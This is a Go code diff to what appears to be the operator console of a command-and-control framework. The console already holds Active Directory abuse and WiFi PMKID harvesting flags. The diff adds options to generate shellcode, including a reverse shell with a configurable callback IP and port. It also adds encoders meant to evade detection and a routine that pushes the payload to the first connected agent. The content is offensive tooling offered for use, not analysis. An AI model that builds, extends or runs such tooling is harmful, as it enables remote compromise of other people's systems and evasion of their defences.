@@ -167,6 +167,13 @@ func main() {
 	adSPN := flag.String("ad-spn", "", "SPN (add_spn / remove_spn)")
 	adPrimaryGID := flag.Uint("ad-primary-gid", 0, "primaryGroupID (set_primary_group)")
 	adEncodedSD := flag.String("ad-encoded-sd", "", "encoded security descriptor (set_rbcd)")
+	scArch := flag.String("shellcode-arch", "linux_x64", "shellcode target: linux_x64|linux_x86|windows_x64|macos_x64")
+	scKind := flag.String("shellcode-kind", "exec_sh", "shellcode kind: exec_sh|reverse_sh|exec_cmd")
+	scEncode := flag.String("shellcode-encode", "none", "encoder: none|xor|rot13|null_free|chunked_xor|base64|uuid|ipv4")
+	scKey := flag.Uint("shellcode-key", 0, "encoder key (xor / rot)")
+	scIP := flag.String("shellcode-ip", "127.0.0.1", "reverse shell target IP")
+	scPort := flag.Uint("shellcode-port", 4444, "reverse shell target port")
+	scWinExec := flag.Uint64("shellcode-winexec", 0, "windows_x64 WinExec address (from PEB walk)")
 	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
 	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
 	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
@@ -549,6 +556,19 @@ func main() {
 			SPN:         *adSPN,
 			PrimaryGID:  uint32(*adPrimaryGID),
 			EncodedSD:   *adEncodedSD,
+		})
+	}
+
+	// shellcode dispatch — generate + encode a stub on the agent
+	if *scKind != "" {
+		go runShellcodeDispatch(mgr, shellcodeArgs{
+			Arch:    *scArch,
+			Kind:    *scKind,
+			Encode:  *scEncode,
+			Key:     uint8(*scKey),
+			IP:      *scIP,
+			Port:    uint16(*scPort),
+			WinExec: *scWinExec,
 		})
 	}
 
@@ -1399,5 +1419,50 @@ func runAdEnumDispatch(mgr *session.Manager, a adEnumArgs) {
 	}
 	if err := s.SendAdEnumStart(sessionID, req); err != nil {
 		log.Printf("[adenum] start: %v", err)
+	}
+}
+
+// shellcodeArgs carries the operator's -shellcode-* flags.
+type shellcodeArgs struct {
+	Arch    string
+	Kind    string
+	Encode  string
+	Key     uint8
+	IP      string
+	Port    uint16
+	WinExec uint64
+}
+
+// runShellcodeDispatch waits for the first agent, fires a ShellcodeStart.
+func runShellcodeDispatch(mgr *session.Manager, a shellcodeArgs) {
+	for len(mgr.Sessions()) == 0 {
+		time.Sleep(500 * time.Millisecond)
+	}
+	s := mgr.Sessions()[0]
+	sessionID := fmt.Sprintf("sc-%d", time.Now().UnixNano())
+
+	log.Printf("[shellcode] %s/%s encode=%s -> %s", a.Arch, a.Kind, a.Encode, s.AgentID)
+
+	// parse ip into [4]byte
+	var ip [4]byte
+	var a1, b1, c1, d1 int
+	if n, _ := fmt.Sscanf(a.IP, "%d.%d.%d.%d", &a1, &b1, &c1, &d1); n == 4 {
+		ip = [4]byte{byte(a1), byte(b1), byte(c1), byte(d1)}
+	} else {
+		ip = [4]byte{127, 0, 0, 1}
+	}
+
+	req := proto.ShellcodeStart{
+		SessionID: sessionID,
+		Arch:      a.Arch,
+		Kind:      a.Kind,
+		Encode:    a.Encode,
+		Key:       a.Key,
+		IP:        ip,
+		Port:      a.Port,
+		WinExec:   a.WinExec,
+	}
+	if err := s.SendShellcodeStart(sessionID, req); err != nil {
+		log.Printf("[shellcode] start: %v", err)
 	}
 }
